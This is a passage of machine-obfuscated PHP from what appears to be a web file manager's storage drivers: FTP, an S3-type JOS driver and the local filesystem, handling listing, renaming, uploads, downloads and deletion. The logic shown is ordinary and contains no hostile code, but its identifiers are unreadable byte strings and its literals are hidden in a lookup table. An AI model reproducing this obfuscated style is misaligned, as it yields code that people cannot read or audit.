$Ó´ƒÀÎŸ = @ftp_rmdir($this->connect, $É¨»Ôú); if (!$Ó´ƒÀÎŸ) { return !1; } } $¡ªĞ•¾ = $this->iconvSystem($¡ªĞ•¾); return @ftp_rmdir($this->connect, $¡ªĞ•¾); } public function rename($´Êç—²ª, $ÆÒ”ÒšÌ) { $ãÕ›ñÛ÷ =& $_SERVER[±³—úê]; if (!$this->_isconn()) { return !1; } $«¸ï¹—„ = $this->fileNameAuto($this->pathFather($´Êç—²ª), $ÆÒ”ÒšÌ); $«¸ï¹—„ = $this->iconvSystem($«¸ï¹—„); $´Êç—²ª = $this->iconvSystem($´Êç—²ª); $“ˆ¡« Ä = $this->pathFather($´Êç—²ª); $˜®ÒË´ = rtrim($“ˆ¡« Ä, $ãÕ›ñÛ÷[8]) . $ãÕ›ñÛ÷[8] . $«¸ï¹—„; $Î¨é²¯ = @ftp_rename($this->connect, $´Êç—²ª, $˜®ÒË´); if (!$Î¨é²¯) { $this->writeLog(__FUNCTION__ . $ãÕ›ñÛ÷[1453], !0); return !1; } $˜®ÒË´ = $this->iconvApp($˜®ÒË´); return $this->getPathOuter($˜®ÒË´); } private function folderInfo($ÑÂä“äõ, $™´òö­Ü = false) { $û¬°­Â =& $_SERVER[±³—úê]; $ÕÃ«§ˆ = array($û¬°­Â[32] => $this->pathThis($ÑÂä“äõ), $û¬°­Â[87] => $this->getPathOuter($û¬°­Â[8] . $ÑÂä“äõ), $û¬°­Â[33] => $û¬°­Â[78]); if ($™´òö­Ü) { return $ÕÃ«§ˆ; } $ÕÃ«§ˆ[$û¬°­Â[243]] = $ÕÃ«§ˆ[$û¬°­Â[88]] = 0; $ÕÃ«§ˆ[$û¬°­Â[244]] = $ÕÃ«§ˆ[$û¬°­Â[245]] = !0; return $ÕÃ«§ˆ; } private function fileInfo($ƒğéÏ, $ ¤¥­ºì = false, $²©ºØŸ® = array()) { $ç¼çÙéÛ =& $_SERVER[±³—úê]; $Š¢ç›Ú = array($ç¼çÙéÛ[32] => $this->pathThis($ƒğéÏ), $ç¼çÙéÛ[87] => $this->getPathOuter($ç¼çÙéÛ[8] . $ƒğéÏ), $ç¼çÙéÛ[33] => $ç¼çÙéÛ[242], $ç¼çÙéÛ[79] => isset($²©ºØŸ®[$ç¼çÙéÛ[79]]) ? $²©ºØŸ®[$ç¼çÙéÛ[79]] : 0, $ç¼çÙéÛ[169] => $this->ext($ƒğéÏ)); if ($ ¤¥­ºì) { return $Š¢ç›Ú; } $Š¢ç›Ú[$ç¼çÙéÛ[243]] = $Š¢ç›Ú[$ç¼çÙéÛ[88]] = 0; $Š¢ç›Ú[$ç¼çÙéÛ[244]] = $Š¢ç›Ú[$ç¼çÙéÛ[245]] = !0; $¦è¥¹Ö¦ = $this->iconvSystem($ƒğéÏ); $Š¢ç›Ú[$ç¼çÙéÛ[88]] = @ftp_mdtm($this->connect, $¦è¥¹Ö¦); if (empty($²©ºØŸ®)) { $²©ºØŸ® = $this->objectMeta($ƒğéÏ); if (!$²©ºØŸ®) { return $Š¢ç›Ú; } } $Š¢ç›Ú[$ç¼çÙéÛ[79]] = $²©ºØŸ®[$ç¼çÙéÛ[79]]; return $Š¢ç›Ú; } public function size($´Ş†îè) { $½ÒÓı÷µ = $this->objectMeta($´Ş†îè); return $½ÒÓı÷µ ? $½ÒÓı÷µ[$_SERVER[±³—úê][79]] : 0; } public function info($ê½½Ùâµ) { if ($this->isFile($ê½½Ùâµ)) { return $this->fileInfo($ê½½Ùâµ, 0); } else { if ($this->isFolder($ê½½Ùâµ)) { return $this->folderInfo($ê½½Ùâµ); } } return !1; } private function fileList($ˆ†ŒØéñ, &$ˆü÷¯É, &$™ï™ë‡§, $Ô—ºÌ· = false) { $ßê‘Ï‰ =& $_SERVER[±³—úê]; $ˆ†ŒØéñ = $this->iconvSystem($ˆ†ŒØéñ); if (!$this->isFolder($ˆ†ŒØéñ)) { return !1; } @ftp_chdir($this->connect, $ßê‘Ï‰[8]); $ˆ†ŒØéñ = rtrim($ˆ†ŒØéñ, $ßê‘Ï‰[8]) . $ßê‘Ï‰[8]; check_abort(); $º¢àµäç = @ftp_rawlist($this->connect, $ˆ†ŒØéñ); if (!$º¢àµäç) { $º¢àµäç = array(); } $‘²ŠœÒ” = array($ßê‘Ï‰[10] => 1, $ßê‘Ï‰[1365] => 1); foreach ($º¢àµäç as $„°Î°“—) { $–ÃàŒ¦É = $this->_listItem($„°Î°“—); if ($–ÃàŒ¦É[0] == $ßê‘Ï‰[838]) { continue; } $ÒµşÒç‰ = $–ÃàŒ¦É[8]; if (empty($ÒµşÒç‰) && $ÒµşÒç‰ !== $ßê‘Ï‰[240] || isset($‘²ŠœÒ”[$ÒµşÒç‰])) { continue; } $ÒµşÒç‰ = $this->iconvApp($ˆ†ŒØéñ . ltrim($ÒµşÒç‰, $ßê‘Ï‰[8])); $Ê¨ßŠÛª = array($ßê‘Ï‰[32] => $ÒµşÒç‰, $ßê‘Ï‰[33] => $ßê‘Ï‰[242], $ßê‘Ï‰[79] => $–ÃàŒ¦É[4]); if (substr($„°Î°“—, 0, 1) == $ßê‘Ï‰[1454]) { $Ê¨ßŠÛª[$ßê‘Ï‰[33]] = $ßê‘Ï‰[78]; $Ê¨ßŠÛª[$ßê‘Ï‰[79]] = 0; } $ı—²ıÂŸ = $Ê¨ßŠÛª[$ßê‘Ï‰[33]] == $ßê‘Ï‰[78] ? !0 : !1; $this->cacheMethodInfoSet($ÒµşÒç‰, $ı—²ıÂŸ, $Ê¨ßŠÛª); if ($ı—²ıÂŸ) { $ˆü÷¯É[] = $ÒµşÒç‰; if ($Ô—ºÌ·) { $this->fileList($ÒµşÒç‰, $ˆü÷¯É, $™ï™ë‡§, $Ô—ºÌ·); } continue; } $™ï™ë‡§[] = $Ê¨ßŠÛª; } $this->cacheMethodInfoSet($ˆ†ŒØéñ, !0); } private function _listItem($„“œ¼¸Ğ) { if (empty($„“œ¼¸Ğ)) { return array(); } $€û²Öİ = preg_split($_SERVER[±³—úê][1455], $„“œ¼¸Ğ); if (count($€û²Öİ) <= 9) { return $€û²Öİ; } $€û²Öİ[8] = trim(substr($„“œ¼¸Ğ, strpos($„“œ¼¸Ğ, $€û²Öİ[7]) + strlen($€û²Öİ[7]))); return array_splice($€û²Öİ, 0, 9); } public function listPath($èìÏÇ, $âÃ’Õñó = false) { $ëÃ¦æ—à =& $_SERVER[±³—úê]; if (!$this->_isconn()) { return !1; } $ª™²½½ï = $§ˆ®öğñ = array(); $this->fileList($èìÏÇ, $ª™²½½ï, $§ˆ®öğñ); foreach ($ª™²½½ï as $Áéôıˆò => $‘×ªƒú·) { $ª™²½½ï[$Áéôıˆò] = $this->folderInfo($‘×ªƒú·, $âÃ’Õñó); } foreach ($§ˆ®öğñ as $Áéôıˆò => $‘×ªƒú·) { $§ˆ®öğñ[$Áéôıˆò] = $this->fileInfo($‘×ªƒú·[$ëÃ¦æ—à[32]], $âÃ’Õñó, $‘×ªƒú·); } return array($ëÃ¦æ—à[85] => $ª™²½½ï, $ëÃ¦æ—à[86] => $§ˆ®öğñ); } public function has($Ÿô£¬Õå, $ì—ñğ ´ = false, $ıüìúŸ = true) { $÷àºğİ =& $_SERVER[±³—úê]; $ÒÁøğÎĞ = $ÆûÜ ƒë = array(); $¡ÛÚ³¨° = $ì—ñğ ´ ? !0 : !1; $this->fileList($Ÿô£¬Õå, $ÒÁøğÎĞ, $ÆûÜ ƒë, $¡ÛÚ³¨°); if ($ì—ñğ ´) { return array($÷àºğİ[251] => count($ÆûÜ ƒë), $÷àºğİ[252] => count($ÒÁøğÎĞ)); } if ($ıüìúŸ) { if (count($ÆûÜ ƒë)) { return !0; } } else { if (count($ÒÁøğÎĞ)) { return !0; } } return !1; } public function listAll($²ğú£) { $Ï§Æ¦Ä¶ =& $_SERVER[±³—úê]; if (!$this->_isconn()) { return !1; } $¬Şµô˜Ÿ = $ú˜¿ø­º = array(); $this->fileList($²ğú£, $¬Şµô˜Ÿ, $ú˜¿ø­º, !0); $¤ÅÚ¯•± = array_to_keyvalue($ú˜¿ø­º, $Ï§Æ¦Ä¶[32]); foreach ($¬Şµô˜Ÿ as $ŸªãÀ“À) { if (is_string($ŸªãÀ“À)) { $¤ÅÚ¯•±[$ŸªãÀ“À] = array($Ï§Æ¦Ä¶[79] => 0); } } return $this->listAllFiles($²ğú£, $¤ÅÚ¯•±); } public function getContent($ÂÖ¬ÆÍ) { if (!$this->_isconn()) { return !1; } $ÂÖ¬ÆÍ = $this->iconvSystem($ÂÖ¬ÆÍ); return $this->fileSubstr($ÂÖ¬ÆÍ); } public function setContent($¢ûÅ÷òı, $œÙ«³ıå = '') { if (!$this->_isconn()) { return !1; } $¬Ê÷ÂÊ¿ = $this->pathThis($this->iconvSystem($¢ûÅ÷òı)); $âøÑ£ã¬ = $this->tempFile($¬Ê÷ÂÊ¿); file_put_contents($âøÑ£ã¬, $œÙ«³ıå); $İóÆ“†¹ = $this->upload($¢ûÅ÷òı, $this->iconvApp($âøÑ£ã¬)); $this->tempFileRemve($âøÑ£ã¬); return $İóÆ“†¹; } public function fileSubstr($é¤ÏÃµ˜, $ì à¥±ë = 0, $Å­‹µ€Ö = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($é¤ÏÃµ˜, $ì à¥±ë, $Å­‹µ€Ö); } private function ftpRequest($õüÃ“Ïº, $¼È«áÂÌ = 0, $‚©ıØá = false) { $õüÃ“Ïº = $this->iconvSystem($õüÃ“Ïº); $°¦£±¿Â = $this->scheme . $this->host . $_SERVER[±³—úê][4] . $this->port; $¾¡¹£… = curl_init(); curl_setopt($¾¡¹£…, CURLOPT_URL, $°¦£±¿Â . $this->pathEncode($õüÃ“Ïº)); curl_setopt($¾¡¹£…, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($‚©ıØá) { $´ËåÚßÀ = $¼È«áÂÌ + $‚©ıØá - 1; curl_setopt($¾¡¹£…, CURLOPT_RANGE, "{$¼È«áÂÌ}\55{$´ËåÚßÀ}"); } curl_setopt($¾¡¹£…, CURLOPT_RETURNTRANSFER, 1); $¢Ñµ‚©¨ = curl_exec($¾¡¹£…); curl_close($¾¡¹£…); return $¢Ñµ‚©¨; } public function upload($Ì±Ò€½, $‘ÎåÈ»ª, $¸Òä¢´¸ = false, $³‹¼ğ›‡ = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($Ì±Ò€½))) { return !1; } $Ì±Ò€½ = $this->iconvSystem($Ì±Ò€½); $‘ÎåÈ»ª = $this->iconvSystem($‘ÎåÈ»ª); $Œ®éîÆî = ftp_nb_put($this->connect, $Ì±Ò€½, $‘ÎåÈ»ª, FTP_BINARY); while ($Œ®éîÆî == FTP_MOREDATA) { $Œ®éîÆî = ftp_nb_continue($this->connect); } if ($Œ®éîÆî != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[±³—úê][1453], !0); return !1; } return $this->getPathOuter($Ì±Ò€½); } public function download($ÙàÎüÉè, $‡„—ÛÂ¥ = '') { if (!$this->_isconn()) { return !1; } $¤²ó°×© = $this->pathFather($‡„—ÛÂ¥); if (!IO::mkdir($¤²ó°×©)) { return !1; } $ÙàÎüÉè = $this->iconvSystem($ÙàÎüÉè); $‡„—ÛÂ¥ = $this->iconvSystem($‡„—ÛÂ¥); $İÓ¥™¯ = ftp_nb_get($this->connect, $‡„—ÛÂ¥, $ÙàÎüÉè, FTP_BINARY); while ($İÓ¥™¯ == FTP_MOREDATA) { $İÓ¥™¯ = ftp_nb_continue($this->connect); } if ($İÓ¥™¯ != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[±³—úê][1453], !0); return !1; } return $this->iconvApp($‡„—ÛÂ¥); } public function exist($Íš—¥¥İ) { return $this->isFile($Íš—¥¥İ) || $this->isFolder($Íš—¥¥İ); } public function isFile($„¦ƒªÆÃ) { return !$this->isFolder($„¦ƒªÆÃ) && $this->objectMeta($„¦ƒªÆÃ); } public function isFolder($¦Ëı§öÊ) { return $this->cacheMethod($_SERVER[±³—úê][179], $¦Ëı§öÊ); } protected function objectMeta($ğ‹Ûä») { return $this->cacheMethod($_SERVER[±³—úê][181], $ğ‹Ûä»); } protected function _objectMeta($öóáÔÏï) { $«½ûË²Ú =& $_SERVER[±³—úê]; if ($öóáÔÏï == $«½ûË²Ú[12] || $öóáÔÏï == $«½ûË²Ú[8]) { return array(); } if (!$this->_isconn()) { return !1; } $öóáÔÏï = $this->iconvSystem($öóáÔÏï); $äÎç˜„ñ = array($«½ûË²Ú[32] => $this->iconvApp($öóáÔÏï), $«½ûË²Ú[33] => $«½ûË²Ú[242], $«½ûË²Ú[79] => 0); @ftp_chdir($this->connect, $«½ûË²Ú[8]); $Ò¬Æ½¬¯ = @ftp_size($this->connect, $öóáÔÏï); if ($Ò¬Æ½¬¯ != -1) { $äÎç˜„ñ[$«½ûË²Ú[79]] = $Ò¬Æ½¬¯; } else { $å´ˆŒ—ı = @ftp_chdir($this->connect, $öóáÔÏï); if (!$å´ˆŒ—ı) { return !1; } $äÎç˜„ñ[$«½ûË²Ú[33]] = $«½ûË²Ú[78]; } return $äÎç˜„ñ; } protected function _isFolder($Ó¸¦œÈ) { $¤ØËÄß€ =& $_SERVER[±³—úê]; if ($Ó¸¦œÈ == $¤ØËÄß€[12] || $Ó¸¦œÈ == $¤ØËÄß€[8]) { return !0; } $ıŒ¥İÊµ = $this->_objectMeta($Ó¸¦œÈ); return isset($ıŒ¥İÊµ[$¤ØËÄß€[33]]) && $ıŒ¥İÊµ[$¤ØËÄß€[33]] == $¤ØËÄß€[78] ? !0 : !1; } } class PathDriverJOS extends PathDriverBaseS3 { public function __construct($è¶Î¿Äî) { parent::__construct($è¶Î¿Äî); $this->setSignVersion($_SERVER[±³—úê][259]); } public function uploadLink($êµŞ’ƒí, $É¸³”„á = 0) { $¼ş¶˜× =& $_SERVER[±³—úê]; if ($this->isUploadServer()) { return; } $ƒ’Áôµø = $this->getType(); if (!in_array($ƒ’Áôµø, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $—½ˆõá¡ = (!$É¸³”„á ? 1 : ceil($É¸³”„á / pow(1024, 3))) * 3600 * 4; $›øÂ—ÏÕ = $this->uploadMultiData($êµŞ’ƒí, $—½ˆõá¡); if ($›øÂ—ÏÕ) { $›øÂ—ÏÕ[$¼ş¶˜×[97]] = $êµŞ’ƒí; $›øÂ—ÏÕ[$¼ş¶˜×[98]] = $ƒ’Áôµø; } return $›øÂ—ÏÕ; } public function fileOutImage($°Á¿û•˜, $×…–¯Õê = 250) { if ($this->size($°Á¿û•˜) > 1024 * 1024 * 25) { return $this->fileOutImageServer($°Á¿û•˜, $×…–¯Õê); } $¾ÖÌóÑù = $this->link($°Á¿û•˜); $¾ÖÌóÑù .= $_SERVER[±³—úê][1456] . $×…–¯Õê; $this->fileOutLink($¾ÖÌóÑù); } public function fileOutLink($Ÿñ•…¡ø) { $´˜ó‰Á =& $_SERVER[±³—úê]; if (substr($Ÿñ•…¡ø, 0, 7) == $´˜ó‰Á[228]) { $Ÿñ•…¡ø = $´˜ó‰Á[229] . substr($Ÿñ•…¡ø, 7); } header($´˜ó‰Á[175] . $Ÿñ•…¡ø); die; } } class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($æèïï²Á) { if (substr($æèïï²Á, 0, 2) == $_SERVER[±³—úê][1413]) { $æèïï²Á = BASIC_PATH . substr($æèïï²Á, 2); } return $æèïï²Á; } public function iconvApp($Ø’¹åÀŸ) { $æ¯˜©² =& $_SERVER[±³—úê]; global $config; return $this->iconvTo($Ø’¹åÀŸ, $config[$æ¯˜©²[1442]], $config[$æ¯˜©²[1441]]); } public function iconvSystem($µÉäÈç) { $Ä¬èİŒá =& $_SERVER[±³—úê]; global $config; return $this->iconvTo($µÉäÈç, $config[$Ä¬èİŒá[1441]], $config[$Ä¬èİŒá[1442]]); } public function getPathOuter($êº”‹Éö) { $Ÿ¡¡Òâ· =& $_SERVER[±³—úê]; $·Á©¿¯ = $this->iconvApp($this->pathBase); $êº”‹Éö = $this->iconvApp($êº”‹Éö); if (substr($·Á©¿¯, 0, 2) == $Ÿ¡¡Òâ·[1413]) { $·Á©¿¯ = BASIC_PATH . substr($·Á©¿¯, 2); } if (substr($êº”‹Éö, 0, 2) == $Ÿ¡¡Òâ·[1413]) { $êº”‹Éö = BASIC_PATH . substr($êº”‹Éö, 2); } $·Á©¿¯ = KodIO::clear($·Á©¿¯); $êº”‹Éö = KodIO::clear($êº”‹Éö); $êº”‹Éö = substr($êº”‹Éö, strlen($·Á©¿¯)); if (empty($this->pathDriver)) { return $êº”‹Éö; } return $this->pathDriver . $Ÿ¡¡Òâ·[8] . ltrim($êº”‹Éö, $Ÿ¡¡Òâ·[8]); } public function mkfile($ØÀëÙ²È, $¤ş× ¶ = '', $³ü×İé‡ = REPEAT_RENAME) { $ØÀëÙ²È = $this->iconvSystem($ØÀëÙ²È); @touch($ØÀëÙ²È); if ($¤ş× ¶) { file_put_contents($ØÀëÙ²È, $¤ş× ¶); } @chmod($ØÀëÙ²È, $this->pathAuth); if (is_file($ØÀëÙ²È)) { return $this->getPathOuter($ØÀëÙ²È); } $this->writeLog(__FUNCTION__ . $_SERVER[±³—úê][1453], !0); return !1; } public function mkdir($Á‰µ´ÍÔ, $«ış®ÑÅ = REPEAT_SKIP) { $Á‰µ´ÍÔ = $this->iconvSystem($Á‰µ´ÍÔ); if (is_dir($Á‰µ´ÍÔ)) { return $this->getPathOuter($Á‰µ´ÍÔ); } @mkdir($Á‰µ´ÍÔ, $this->pathAuth, !0); @chmod($Á‰µ´ÍÔ, $this->pathAuth); if (is_dir($Á‰µ´ÍÔ)) { return $this->getPathOuter($Á‰µ´ÍÔ); } $this->writeLog(__FUNCTION__ . $_SERVER[±³—úê][1453], !0); return !1; } public function copyFile($Î½®ÅåÀ, $°ŠÍ®§Ù) { $this->mkdir($this->pathFather($°ŠÍ®§Ù)); $Î½®ÅåÀ = $this->iconvSystem($Î½®ÅåÀ); $°ŠÍ®§Ù = $this->iconvSystem($°ŠÍ®§Ù); $Ìö‡ğâò = copy_64($Î½®ÅåÀ, $°ŠÍ®§Ù); @chmod($°ŠÍ®§Ù, $this->pathAuth); if ($Ìö‡ğâò) { return $this->getPathOuter($°ŠÍ®§Ù); } $this->writeLog(__FUNCTION__ . $_SERVER[±³—úê][1453], !0); return !1; } public function moveFile($ÄÊË½§, $¶×„ø®) { $this->mkdir($this->pathFather($¶×„ø®)); $ÄÊË½§ = $this->iconvSystem($ÄÊË½§); $¶×„ø® = $this->iconvSystem($¶×„ø®); $”íÓüïğ = intval(@rename($ÄÊË½§, $¶×„ø®)); if (!$”íÓüïğ) { if ($”íÓüïğ = intval(@copy_64($ÄÊË½§, $¶×„ø®))) { @unlink($ÄÊË½§); } } @chmod($¶×„ø®, $this->pathAuth); if ($”íÓüïğ) { return $this->getPathOuter($¶×„ø®); } $this->writeLog(__FUNCTION__ . $_SERVER[±³—úê][1453], !0); return !1; } public function movePath($¨Ôú–İã, $­¯„ïÆ›, $¦Ğå¼ê = false) { $ÃµŒæ¨ =& $_SERVER[±³—úê]; $¨Ôú–İã = $this->iconvSystem($¨Ôú–İã); $­¯„ïÆ› = $this->iconvSystem($­¯„ïÆ›); $€À°†òâ = rtrim($­¯„ïÆ›, $ÃµŒæ¨[8]) . $ÃµŒæ¨[8] . ($¦Ğå¼ê ? $¦Ğå¼ê : get_path_this($¨Ôú–İã)); if (file_exists($€À°†òâ)) { return !1; } $Ìãêîº° = intval(@rename($¨Ôú–İã, $€À°†òâ)); $Ìãêîº° = file_exists($€À°†òâ); if ($Ìãêîº°) { return $this->getPathOuter($€À°†òâ); } $this->writeLog(__FUNCTION__ . $ÃµŒæ¨[1453], !0); return !1; } public function delFile($®Î›Üîƒ) { $®Î›Üîƒ = $this->iconvSystem($®Î›Üîƒ); if (!@unlink($®Î›Üîƒ)) { @chmod($®Î›Üîƒ, $this->pathAuth); if (@unlink($®Î›Üîƒ)) { return !0; } $this->writeLog(__FUNCTION__ . $_SERVER[±³—úê][1453], !0); return !1; } return !0; } public function delFolder($Óı—´ç) { $í¯Êä  =& $_SERVER[±³—úê]; $Óı—´ç = $this->iconvSystem($Óı—´ç); if (!is_dir($Óı—´ç)) { return !0; } if (!($×ïÈîôò = opendir($Óı—´ç))) { return !1; } while (($è‘Â™‹ì = readdir($×ïÈîôò)) !== !1) { if ($è‘Â™‹ì == $í¯Êä [10] || $è‘Â™‹ì == $í¯Êä [1365]) { continue; } $Ş³Õ·Ø = $Óı—´ç . $í¯Êä [8] . $è‘Â™‹ì; if (is_file($Ş³Õ·Ø) || is_link($Ş³Õ·Ø)) { if (!unlink($Ş³Õ·Ø)) { chmod($Ş³Õ·Ø, $this->pathAuth); if (!unlink($Ş³Õ·Ø)) { return !1; } } } else { if (is_dir($Ş³Õ·Ø)) { chmod($Ş³Õ·Ø, $this->pathAuth); $Ş³Õ·Ø = $this->iconvApp($Ş³Õ·Ø); if (!$this->delFolder($Ş³Õ·Ø)) { return !1; } } } } closedir($×ïÈîôò); return rmdir($Óı—´ç); } public function rename($½ÃÇĞØ, $¿Ÿâª°×) { $…ÚÏîÅÕ =& $_SERVER[±³—úê]; $èÂÍØéÖ = $this->fileNameAuto($this->pathFather($½ÃÇĞØ), $¿Ÿâª°×); $èÂÍØéÖ = $this->iconvSystem($èÂÍØéÖ); $½ÃÇĞØ = $this->iconvSystem($½ÃÇĞØ); $ªƒı¯ÇĞ = $this->pathFather($½ÃÇĞØ); $¥™øÔ = rtrim($ªƒı¯ÇĞ, $…ÚÏîÅÕ[8]) . $…ÚÏîÅÕ[8] . $èÂÍØéÖ; $ÏÑµı‹ = @rename($½ÃÇĞØ, $¥™øÔ); $¥™øÔ = $this->iconvApp($¥™øÔ); if ($ÏÑµı‹) { return $this->getPathOuter($¥™øÔ); } $this->writeLog(__FUNCTION__ . $…ÚÏîÅÕ[1453], !0); return !1; } public function size($®ßÅğ·) { $®ßÅğ· = $this->iconvSystem($®ßÅğ·); return filesize_64($®ßÅğ·); } public function info($¥±ªİ‚) { $¥±ªİ‚ = $this->iconvSystem($¥±ªİ‚); if ($this->isFolder($¥±ªİ‚)) { return $this->folderInfo($¥±ªİ‚); } else { if ($this->isFile($¥±ªİ‚)) { return $this->fileInfo($¥±ªİ‚); } } return !1; } protected function infoChildren($Ó¸ù›Û´, &$£’…âŞ, $‚¿Ş·ƒ = true) { $ÃëËŸœ =& $_SERVER[±³—úê]; check_abort_echo(); $Ó¸ù›Û´ = rtrim($Ó¸ù›Û´, $ÃëËŸœ[8]) . $ÃëËŸœ[8]; if ($‚¿Ş·ƒ) { $Ó¸ù›Û´ = $this->iconvSystem($Ó¸ù›Û´); } if (!($ó¼À„°Ü = @opendir($Ó¸ù›Û´))) { return; } while (($‚şÜéóİ = readdir($ó¼À„°Ü)) !== !1) { if ($‚şÜéóİ == $ÃëËŸœ[10] || $‚şÜéóİ == $ÃëËŸœ[1365]) { continue; } $Óõµùçè = $Ó¸ù›Û´ . $‚şÜéóİ; if (is_file($Óõµùçè) || is_link($Óõµùçè)) { $£’…âŞ[$ÃëËŸœ[80]]++; $£’…âŞ[$ÃëËŸœ[79]] += filesize_64($Óõµùçè); } else { if (is_dir($Óõµùçè)) { $£’…âŞ[$ÃëËŸœ[81]]++; $this->infoChildren($Óõµùçè, $£’…âŞ, !1); } } } closedir($ó¼À„°Ü); } private function folderInfo($š¥„½”, $şÖİÙÔÊ = false) { $¡Ô•½°é =& $_SERVER[±³—úê]; $š¥„½” = rtrim($š¥„½”, $¡Ô•½°é[8]) . $¡Ô•½°é[8]; $Æ¥ûú˜¯ = $this->iconvApp($this->pathThis($š¥„½”)); if ($şÖİÙÔÊ) { return array($¡Ô•½°é[32] => $Æ¥ûú˜¯, $¡Ô•½°é[87] => $this->getPathOuter($š¥„½”), $¡Ô•½°é[33] => $¡Ô•½°é[78]); } $¢ÂÅğª° = array($¡Ô•½°é[32] => $Æ¥ûú˜¯, $¡Ô•½°é[87] => $this->getPathOuter($š¥„½”), $¡Ô•½°é[33] => $¡Ô•½°é[78], $¡Ô•½°é[243] => @filectime($š¥„½”), $¡Ô•½°é[88] => @filemtime($š¥„½”), $¡Ô•½°é[1457] => @fileatime($š¥„½”), $¡Ô•½°é[1458] => is_readable($š¥„½”), $¡Ô•½°é[1459] => is_writable($š¥„½”), $¡Ô•½°é[1460] => get_mode($š¥„½”)); return $¢ÂÅğª°; } private function fileInfo($í šã¦», $àÍ‚¢£ö = false) { $£“š¤²œ =& $_SERVER[±³—úê]; $·‘Ãä¨ = $this->iconvApp($this->pathThis($í šã¦»)); if ($àÍ‚¢£ö) { return array($£“š¤²œ[32] => $·‘Ãä¨, $£“š¤²œ[87] => $this->getPathOuter($í šã¦»), $£“š¤²œ[33] => $£“š¤²œ[242], $£“š¤²œ[79] => $this->size($í šã¦»), $£“š¤²œ[169] => $this->ext($·‘Ãä¨)); } $¼êä°¾² = array($£“š¤²œ[32] => $·‘Ãä¨, $£“š¤²œ[87] => $this->getPathOuter($í šã¦»), $£“š¤²œ[33] => $£“š¤²œ[242], $£“š¤²œ[243] => @filectime($í šã¦»), $£“š¤²œ[88] => @filemtime($í šã¦»), $£“š¤²œ[1457] => @fileatime($í šã¦»), $£“š¤²œ[79] => $this->size($í šã¦»), $£“š¤²œ[169] => $this->ext($·‘Ãä¨), $£“š¤²œ[1458] => is_readable($í šã¦»), $£“š¤²œ[1459] => is_writable($í šã¦»), $£“š¤²œ[1460] => get_mode($í šã¦»)); return $¼êä°¾²; } public function exist($ı×Îªİª) { $ı×Îªİª = $this->iconvSystem($ı×Îªİª); return @file_exists($ı×Îªİª); } public function isFile($¢•óÙ°) { $¢•óÙ° = $this->iconvSystem($¢•óÙ°); return @is_file($¢•óÙ°); } public function isFolder($Æš¦Ó×Î) { $Æš¦Ó×Î = $this->iconvSystem($Æš¦Ó×Î); return @is_dir($Æš¦Ó×Î); } public function listPath($”ÀÀ¨¾å, $´úøÄš³ = false) { $†êÅÙˆ =& $_SERVER[±³—úê]; $”ÀÀ¨¾å = $this->iconvSystem($”ÀÀ¨¾å); $”ÀÀ¨¾å = rtrim($”ÀÀ¨¾å, $†êÅÙˆ[8]) . $†êÅÙˆ[8]; $‡ïïó“ = array($†êÅÙˆ[85] => array(), $†êÅÙˆ[86] => array()); if (!($ªè£’˜º = @opendir($”ÀÀ¨¾å))) { return $‡ïïó“; } while (($§»™åï = readdir($ªè£’˜º)) !== !1) { if ($§»™åï == $†êÅÙˆ[10] || $§»™åï == $†êÅÙˆ[1365]) { continue; } $Ã»¸†Ş˜ = $”ÀÀ¨¾å . $§»™åï; if (is_file($Ã»¸†Ş˜)) { $‡ïïó“[$†êÅÙˆ[86]][] = $this->fileInfo($Ã»¸†Ş˜, $´úøÄš³); } else { $‡ïïó“[$†êÅÙˆ[85]][] = $this->folderInfo($Ã»¸†Ş˜, $´úøÄš³); } } closedir($ªè£’˜º); return $‡ïïó“; } public function listAll($Ù„Õ“½¶, &$à¦éÒ²Ü = array()) { $û†ŠÌ§ =& $_SERVER[±³—úê]; $Ù„Õ“½¶ = $this->iconvSystem($Ù„Õ“½¶); $Ù„Õ“½¶ = rtrim($Ù„Õ“½¶, $û†ŠÌ§[8]) . $û†ŠÌ§[8]; if (!($±¿ÁÖÁ‘ = @opendir($Ù„Õ“½¶))) { return $à¦éÒ²Ü; } while (($€À¶ˆÃ½ = readdir($±¿ÁÖÁ‘)) !== !1) { if ($€À¶ˆÃ½ == $û†ŠÌ§[10] || $€À¶ˆÃ½ == $û†ŠÌ§[1365]) { continue; } $¯Ù—¦¢ = $Ù„Õ“½¶ . $€À¶ˆÃ½; $Ò®ÚŒå = is_dir($¯Ù—¦¢) && !is_link($¯Ù—¦¢) ? 1 : 0; $¯Ù—¦¢ = $Ò®ÚŒå ? $¯Ù—¦¢ . $û†ŠÌ§[8] : $¯Ù—¦¢; $à¦éÒ²Ü[] = array($û†ŠÌ§[87] => $¯Ù—¦¢, $û†ŠÌ§[78] => $Ò®ÚŒå, $û†ŠÌ§[88] => intval(@filemtime($¯Ù—¦¢)), $û†ŠÌ§[79] => $Ò®ÚŒå ? 0 : intval($this->size($¯Ù—¦¢))); if ($Ò®ÚŒå) { $this->listAll($¯Ù—¦¢, $à¦éÒ²Ü); } } closedir($±¿ÁÖÁ‘); return $à¦éÒ²Ü; } public function has($‹ŒÉİµŠ, $Õ¶ÛöÊ = false, $ ÍÁ¢Šæ = true) { $·ó¶Ï—è =& $_SERVER[±³—úê]; $‹ŒÉİµŠ = $this->iconvSystem($‹ŒÉİµŠ); $‹ŒÉİµŠ = rtrim($‹ŒÉİµŠ, $·ó¶Ï—è[8]) . $·ó¶Ï—è[8]; if (!($İáîŠ‚ = @opendir($‹ŒÉİµŠ))) { return !1; } $ÏŸÑùß = 0; $ßå±½Úì = 0; $Ó‹¬É˜á = 0; while (($÷‘¸×› = readdir($İáîŠ‚)) !== !1) { if ($÷‘¸×› == $·ó¶Ï—è[10] || $÷‘¸×› == $·ó¶Ï—è[1365]) { continue; } $‰–À¾ƒ¿ = $‹ŒÉİµŠ . $÷‘¸×›; if ($Õ¶ÛöÊ) { $Ó‹¬É˜á++; if (@is_file($‰–À¾ƒ¿)) { $ÏŸÑùß++; } else { $ßå±½Úì++; } if ($Ó‹¬É˜á > 10000) { break; } continue; } if ($ ÍÁ¢Šæ) { if (@is_file($‰–À¾ƒ¿)) { return !0; } } else { if (@is_dir($‰–À¾ƒ¿ . 